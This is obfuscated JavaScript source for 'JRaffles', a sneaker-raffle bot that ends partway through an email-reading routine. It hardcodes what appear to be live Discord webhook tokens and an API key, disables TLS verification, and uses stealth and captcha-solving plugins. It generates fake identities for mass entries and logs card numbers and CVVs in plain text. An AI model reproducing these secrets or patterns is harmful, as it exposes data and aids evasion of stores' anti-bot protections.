process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x7d8dbf = require('fs'), _0xc7171d = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x3aaa17(_0x3f1a73) {
    const _0x50a787 = _0x7d8dbf['createWriteStream'](_0x3f1a73, { 'flags': 'a' }), _0x23b02e = console['log'];
    console['log'] = function () {
        const _0x45e075 = Array['prototype']['slice']['call'](arguments), _0x2d1ccd = _0x45e075['join']('\x20') + '\x0a';
        _0x50a787['write'](_0x2d1ccd), _0x23b02e['apply'](console, _0x45e075);
    };
}
_0x3aaa17('../logs/log\x20' + _0xc7171d);
var _0x53b450 = require('tough-cookie'), _0x3dffcd = require('node-imap'), _0x4dd7b1 = require('util')['inspect'];
const _0x255d24 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x46695c } = require('discord.js');
var _0x41d678 = require('exe');
const { execFile: _0x2f7f0 } = require('child_process'), _0x4ab5bb = require('puppeteer-extra'), _0x45c327 = require('puppeteer-extra-plugin-recaptcha'), _0x44f368 = require('puppeteer-extra-plugin-stealth'), _0x387ef2 = require('chalk'), _0x55ca22 = require('node-bash-title'), _0x1ea050 = require('axios'), _0x16e760 = require('papaparse');
var _0xb02aa0 = require('random-name');
const _0x23fd33 = require('request');
var _0x45ed26 = require('prompt');
const _0x23361c = _0x23fd33['jar']();
var _0x5450ed = {};
const _0x2f3644 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2d6fdf = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x459150 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x10335a = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x265d71 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0xffc1bd = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x2e776f = 'https://discord.com/api/webhooks/', _0x250708 = '' + _0x2e776f + _0x459150, _0x2b5f53 = '' + _0x2e776f + _0x10335a, _0xf35405 = '' + _0x2e776f + _0x2f3644, _0x47580b = '' + _0x2e776f + _0x2d6fdf, _0x1bf959 = '' + _0x2e776f + _0x265d71, _0x2042d9 = '' + _0x2e776f + _0xffc1bd;
const _0x5d99b3 = JSON['parse'](_0x7d8dbf['readFileSync']('../package.json', 'utf-8')), _0x21b502 = _0x5d99b3['version'];
var _0x121079, _0x590947, _0x10af82, _0x2715ad, _0x3ac93a, _0x439fa3, _0x15d59c, _0xfb4497;
const _0x2176ad = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x1bbc43 = ![];
const _0x1807d0 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0xe8b9b0 = '0123456789';
var _0x4129da = _0x1807d0['split']('');
const _0x3b119c = require('auto-git-update'), _0x1ea260 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x425395 = new _0x3b119c(_0x1ea260);
async function _0x54c091() {
    _0x3ac93a = _0x7d8dbf['readdirSync']('../proxies'), _0x2715ad = _0x7d8dbf['readdirSync']('../tasks'), !_0x7d8dbf['existsSync']('../accounts/fenom.csv') && _0x7d8dbf['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x7d8dbf['existsSync']('../accounts/bstn.csv') && _0x7d8dbf['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x7d8dbf['existsSync']('../accounts/eql.csv') && _0x7d8dbf['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x7d8dbf['existsSync']('../failed-tasks.csv') && _0x7d8dbf['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x7d8dbf['existsSync']('../successful-tasks.csv') && _0x7d8dbf['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x5450ed = JSON['parse'](_0x7d8dbf['readFileSync']('../settings.json', 'utf-8')), !_0x5450ed['delay'] && (_0x5450ed['delay'] = 0x3c, _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['masterMail'] && (_0x5450ed['masterMail'] = 'yourmail@gmail.com', _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['masterPassword'] && (_0x5450ed['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['captchaKey'] && (_0x5450ed['captchaKey'] = '', _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['useRandomProxy'] && (_0x5450ed['useRandomProxy'] = !![], _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['shuffleTasks'] && (_0x5450ed['shuffleTasks'] = ![], _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), !_0x5450ed['webhook'] && (_0x5450ed['webhook'] = '', _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), _0x5450ed['delay'] <= 0x1388 && (_0x5450ed['delay'] = _0x5450ed['delay'] * 0x3e8), _0x5450ed['AfewDelay'] && (delete _0x5450ed['AfewDelay'], _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), _0x5450ed['MahaDelay'] && (delete _0x5450ed['MahaDelay'], _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), _0x5450ed['footshopDelay'] && (delete _0x5450ed['footshopDelay'], _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed, null, 0x2))), _0x5450ed['MahaDelay'] = _0x5450ed['delay'], _0x2e776f = _0x5450ed['webhook'], _0x439fa3 = _0x5450ed['licenseKey'];
}
let _0x4d13f4, _0x378a93 = [], _0x13ca10;
const _0x488ffe = _0x29d240 => new Promise(_0x3069a4 => setTimeout(_0x3069a4, _0x29d240));
function _0x1fafbb(_0x215725, _0x323c7f) {
    return Math['floor'](Math['random']() * (_0x323c7f - _0x215725 + 0x1) + _0x215725);
}
function _0x383032(_0xeef7ef) {
    let _0x39699d = _0xeef7ef['length'], _0x32e41b;
    while (_0x39699d != 0x0) {
        _0x32e41b = Math['floor'](Math['random']() * _0x39699d), _0x39699d--, [_0xeef7ef[_0x39699d], _0xeef7ef[_0x32e41b]] = [
            _0xeef7ef[_0x32e41b],
            _0xeef7ef[_0x39699d]
        ];
    }
    return _0xeef7ef;
}
async function _0xf6a119(_0x217e15) {
    return _0x1ea050['get']('https://api.hyper.co/v4/licenses/' + _0x217e15, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2176ad } })['then'](_0x369ad6 => _0x369ad6['data'])['catch'](() => null);
}
;
async function _0x25ae06(_0x43684e) {
    console['clear']();
    if (_0x43684e == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3ac0af = await _0x45ed26['get']('License');
        if (_0x3ac0af['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x488ffe(0xbb8), _0x25ae06(_0x43684e);
        _0x43684e = _0x3ac0af['License'], _0x5450ed['licenseKey'] = _0x43684e, _0x439fa3 = _0x43684e, _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed));
    }
    console['log']('Checking\x20license\x20' + _0x439fa3 + '...'), await _0x488ffe(0x320);
    const _0x5a4d2f = await _0xf6a119(_0x43684e);
    _0x15d59c = JSON['stringify'](_0x5a4d2f['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0xfb4497 = JSON['stringify'](_0x5a4d2f['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x5a4d2f)
        return console['log']('License\x20not\x20found');
    if (!_0x5a4d2f['user'])
        return console['log']('License\x20not\x20bound');
    return _0x5a4d2f['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x1bbc43 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x1bbc43 = ![]);
}
async function _0x15311c() {
    var _0x54c712 = await _0x45ed26['get']('Module');
    return console['clear'](), _0x54c712['Module'];
}
;
async function _0x43834d() {
    var _0x2b5d73 = await _0x45ed26['get']('Setting');
    return console['clear'](), _0x2b5d73['Setting'];
}
async function _0x3ea38a(_0x361963) {
    var _0x1c37ae = [];
    for (file of _0x2715ad) {
        var _0xa0a1fc = _0x7d8dbf['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x16e760['parse'](_0xa0a1fc, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x361963['store'] && _0x1c37ae['push'](file);
    }
    !_0x1c37ae['length'] == 0x0 && (_0x2715ad = _0x1c37ae);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5f3f31 = 0x0; _0x5f3f31 < _0x2715ad['length']; _0x5f3f31++) {
        console['log']('\x20(' + _0x5f3f31 + ')\x20' + _0x2715ad[_0x5f3f31]);
    }
    console['log']('');
    var _0x327113 = await _0x45ed26['get']('Task');
    if (_0x327113['Task'] > _0x2715ad['length'] - 0x1 || isNaN(_0x327113['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x488ffe(0x3e8), _0x3ea38a();
    var _0x2ca114 = _0x7d8dbf['readFileSync']('../tasks/' + _0x2715ad[_0x327113['Task']], 'utf-8');
    return _0x10af82 = _0x16e760['parse'](_0x2ca114, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x387ef2['blue'](_0x2715ad[_0x327113['Task']])), _0x121079 = _0x2715ad[_0x327113['Task']], _0x10af82;
}
async function _0x3d2085() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x67e597 = 0x0; _0x67e597 < _0x3ac93a['length']; _0x67e597++) {
        console['log']('\x20(' + _0x67e597 + ')\x20' + _0x3ac93a[_0x67e597]);
    }
    console['log']('');
    var _0x8c66c8 = await _0x45ed26['get']('Proxies');
    if (_0x8c66c8['Proxies'] > _0x3ac93a['length'] - 0x1 || isNaN(_0x8c66c8['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x488ffe(0x3e8), _0x3d2085();
    var _0x30227f = _0x7d8dbf['readFileSync']('../proxies/' + _0x3ac93a[_0x8c66c8['Proxies']], 'utf-8')['split']('\x0a');
    let _0x35554c = _0x30227f['map']((_0x472293, _0x526323) => {
        sanatizeProxy = _0x472293['replace']('\x0d', '');
        if (_0x30227f[_0x526323 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x590947 = _0x3ac93a[_0x8c66c8['Proxies']], console['clear'](), _0x35554c;
}
async function _0x2e6d93() {
    var _0x4fee39 = await _0x45ed26['get']('Value');
    return console['clear'](), _0x4fee39['Value'];
}
async function _0x5cf0f3(_0x3e726f) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5ee582 = 0x0; _0x5ee582 < _0x3e726f['length']; _0x5ee582++) {
        console['log']('\x20(' + _0x5ee582 + ')\x20[' + _0x3e726f[_0x5ee582]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x17df90 = await _0x45ed26['get']('Module');
    return _0x17df90['Module'];
}
async function _0x3462cf() {
    var _0x2e868d = await _0x45ed26['get']('Password');
    return console['clear'](), _0x2e868d['Password'];
}
;
async function _0x2e785c() {
    var _0x59c679 = await _0x45ed26['get']('Links');
    return _0x59c679['Links'];
}
;
async function _0x5376fe() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x10e351 = 0x0; _0x10e351 < _0x378a93['length']; _0x10e351++) {
        console['log']('\x20(' + _0x10e351 + ')\x20' + _0x378a93[_0x10e351]);
    }
    ;
    console['log']();
    let _0x51cc71 = await _0x45ed26['get']('Product');
    return console['clear'](), _0x51cc71['Product'];
}
;
function _0x42a46a() {
    var _0x3246a2 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x3246a2;
}
;
function _0x47d2eb() {
    var _0x2e8a2a = new Date(Date['now']())['toLocaleString']();
    return _0x2e8a2a['replace'](',', '');
}
async function _0x49f827(_0x5282c8, _0x1631f4) {
    let _0x3219d9 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x21b502 != 'devkey') {
        await _0x1ea050['post'](_0x5282c8, _0x1631f4, _0x3219d9);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x5605d8(_0x3ad7cb, _0x54d915, _0xf1c721, _0x3cbef5, _0x16ca76) {
    if (!_0x3cbef5 && _0xf1c721 == 'dev') {
        var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x54d915['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x54d915['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x3ad7cb['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x5450ed['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x15d59c,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x3ad7cb['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x3ad7cb['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x21b502,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1b94af['data'];
    } else {
        if (_0x3cbef5 && _0xf1c721 == 'dev') {
            var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x54d915['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x15d59c,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x54d915['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x3ad7cb['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x5450ed['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x16ca76,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x3ad7cb['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x3ad7cb['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x21b502,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1b94af['data'];
        } else {
            if (_0xf1c721 == 'pub') {
                var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x54d915['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x54d915['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x3ad7cb['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x5450ed['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x3ad7cb['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x21b502,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1b94af['data'];
            } else {
                if (_0xf1c721 == 'acc' && !_0x3cbef5) {
                    var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x54d915['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x15d59c,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x54d915['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x5450ed['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x21b502,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1b94af['data'];
                } else {
                    if (_0xf1c721 == 'acc' && _0x3cbef5) {
                        var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x54d915['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x15d59c,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x16ca76,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x54d915['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x5450ed['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x21b502,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1b94af['data'];
                    } else {
                        if (_0xf1c721 == 'open') {
                            var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0xfb4497)['addFields']({
                                'name': 'User',
                                'value': '' + _0x15d59c,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x21b502,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1b94af['data'];
                        } else {
                            if (!_0x3cbef5 && _0xf1c721 == 'ver') {
                                var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x54d915['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x15d59c,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x54d915['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x5450ed['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x21b502,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1b94af['data'];
                            } else {
                                if (_0x3cbef5 && _0xf1c721 == 'ver') {
                                    var _0x1b94af = new _0x46695c()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x54d915['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x15d59c,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x16ca76,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x54d915['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5450ed['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x21b502,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1b94af['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3215be(_0x3c7bba, _0x3bf353) {
    var _0x637ca5 = _0x3c7bba[_0x3bf353]['Address1']['split'](''), _0x410d39 = _0x3c7bba[_0x3bf353]['Address2']['split'](''), _0x597950 = _0x3c7bba[_0x3bf353]['Email']['split']('@');
    for (var _0x48a8d0 = 0x0; _0x48a8d0 < _0x637ca5['length']; _0x48a8d0++) {
        if (_0x637ca5[_0x48a8d0] == 'X') {
            var _0x413321 = Math['round'](Math['random']() * (_0x1807d0['length'] - 0x1));
            _0x637ca5[_0x48a8d0] = _0x4129da[_0x413321];
        }
    }
    ;
    for (var _0x48a8d0 = 0x0; _0x48a8d0 < _0x410d39['length']; _0x48a8d0++) {
        if (_0x410d39[_0x48a8d0] == 'X') {
            var _0x413321 = Math['round'](Math['random']() * (_0x1807d0['length'] - 0x1));
            _0x410d39[_0x48a8d0] = _0x4129da[_0x413321];
        }
    }
    ;
    _0x3c7bba[_0x3bf353]['FirstName'] == 'RANDOM' && (_0x3c7bba[_0x3bf353]['FirstName'] = _0xb02aa0['first']());
    _0x3c7bba[_0x3bf353]['LastName'] == 'RANDOM' && (_0x3c7bba[_0x3bf353]['LastName'] = _0xb02aa0['last']());
    _0x597950[0x0] == 'RANDOM' ? _0x597950[0x0] = '' + _0xb02aa0['first']() + _0xb02aa0['last']() + _0x1fafbb(0x1, 0x270f) + '@' : _0x597950[0x0] = _0x597950[0x0] + '@';
    _0x3c7bba[_0x3bf353]['Email'] = _0x597950['join'](''), _0x3c7bba[_0x3bf353]['Address1'] = _0x637ca5['join'](''), _0x3c7bba[_0x3bf353]['Address2'] = _0x410d39['join']('');
    _0x3c7bba[_0x3bf353]['Phone'] == 'RANDOM' && (_0x3c7bba[_0x3bf353]['Phone'] = '0' + _0x1fafbb(0x5f5e100, 0x3b9ac9ff));
    if (_0x3c7bba[_0x3bf353]['Follower'] == 'RANDOM') {
        var _0x1b5f56 = _0x1fafbb(0x1, 0x270f);
        _0x3c7bba[_0x3bf353]['Follower'] = '' + _0xb02aa0['first']() + _0xb02aa0['last']() + _0x1b5f56 + '\x20';
    }
    _0x3c7bba[_0x3bf353]['HouseNumber'] == 'RANDOM' && (_0x3c7bba[_0x3bf353]['HouseNumber'] = _0x1fafbb(0x1, 0xc8));
    if (_0x3c7bba[_0x3bf353]['Address1'] == 'RANDOM') {
        var _0x3a7458 = Math['round'](Math['random']() * (_0x1807d0['length'] - 0x1)), _0x4f0a23 = _0x4129da[_0x3a7458];
        _0x3c7bba[_0x3bf353]['Address1'] = _0xb02aa0['last']() + 'straat', _0x3c7bba[_0x3bf353]['Zip'] == '' && (_0x3c7bba[_0x3bf353]['Postcode'] = _0x1fafbb(0x3e8, 0x270f) + '\x20' + _0x4f0a23 + _0x4f0a23, _0x3c7bba[_0x3bf353]['Zip'] = _0x3c7bba[_0x3bf353]['Postcode']), _0x3c7bba[_0x3bf353]['HouseNumber'] = '' + _0x1fafbb(0x1, 0xc8);
    }
    return;
}
;
async function _0x2e6413(_0x5e9493, _0x297a8b) {
    _0x7d8dbf['appendFileSync']('../failed-tasks.csv', _0x47d2eb() + ',' + _0x297a8b['store'] + ',' + _0x297a8b['name'] + ',' + _0x5e9493['Url'] + ',' + _0x5e9493['Size'] + ',' + _0x5e9493['Follower'] + ',' + _0x5e9493['FirstName'] + ',' + _0x5e9493['LastName'] + ',' + _0x5e9493['Address1'] + ',' + _0x5e9493['Address2'] + ',' + _0x5e9493['HouseNumber'] + ',' + _0x5e9493['Zip'] + ',' + _0x5e9493['City'] + ',' + _0x5e9493['State'] + ',' + _0x5e9493['Country'] + ',' + _0x5e9493['Phone'] + ',' + _0x5e9493['Email'] + ',' + _0x5e9493['Password'] + ',' + _0x5e9493['PaymentMethod'] + ',' + _0x5e9493['CardType'] + ',' + _0x5e9493['NameOnCard'] + ',' + _0x5e9493['CardNumber'] + ',' + _0x5e9493['ExpiryDate'] + ',' + _0x5e9493['CVV'] + ',' + _0x5e9493['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0xb5b21(_0x288add, _0x1d2a5f) {
    _0x7d8dbf['appendFileSync']('../successful-tasks.csv', _0x47d2eb() + ',' + _0x1d2a5f['store'] + ',' + _0x1d2a5f['name'] + ',' + _0x288add['Url'] + ',' + _0x288add['Size'] + ',' + _0x288add['Follower'] + ',' + _0x288add['FirstName'] + ',' + _0x288add['LastName'] + ',' + _0x288add['Address1'] + ',' + _0x288add['Address2'] + ',' + _0x288add['HouseNumber'] + ',' + _0x288add['Zip'] + ',' + _0x288add['City'] + ',' + _0x288add['State'] + ',' + _0x288add['Country'] + ',' + _0x288add['Phone'] + ',' + _0x288add['Email'] + ',' + _0x288add['Password'] + ',' + _0x288add['PaymentMethod'] + ',' + _0x288add['CardType'] + ',' + _0x288add['NameOnCard'] + ',' + _0x288add['CardNumber'] + ',' + _0x288add['ExpiryDate'] + ',' + _0x288add['CVV'] + ',' + _0x288add['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3e7241() {
    let _0x2d7f73 = proxyFile['split']('\x0a'), _0x2196fe = _0x2d7f73['map']((_0xf899a6, _0x39608c) => {
        sanatizeProxy = _0xf899a6['replace']('\x0d', '');
        if (_0x2d7f73[_0x39608c + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2196fe;
}
;
async function _0x13fff9(_0x38c7e8, _0x42f703) {
    if (_0x2dc7e3 != 'yes')
        var _0x2dc7e3 = '', _0x3662a1 = 0x0;
    var _0x3e4b5f = [];
    async function _0x3f8ac9() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x176847 = await _0x45ed26['get']('Quantity')['Quantity'], _0x2f7b32 = new _0x3dffcd({
            'user': _0x5450ed['masterMail'],
            'password': _0x5450ed['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x3dd294(_0x31253d) {
            _0x2f7b32['openBox']('INBOX', ![], _0x31253d);
        }
        _0x2f7b32['once']('ready', function () {
            _0x3dd294(function (_0x13fe89, _0x4f886c) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x13fe89)
                    throw _0x13fe89;
                _0x2f7b32['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x321473, _0x47d9a7) {
                    if (!_0x47d9a7 || !_0x47d9a7['length'])
                        console['log'](_0x42a46a() + '\x20[' + _0x38c7e8['name'] + ']\x20No\x20mails\x20found'), _0x2f7b32['end']();
                    else {
                        var _0x2aff6e = _0x2f7b32['seq']['fetch'](_0x47d9a7, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x2aff6e['on']('message', function (_0x145e10, _0x53ac71) {
                            var _0x5e71ce = '(#' + _0x53ac71 + ')\x20';
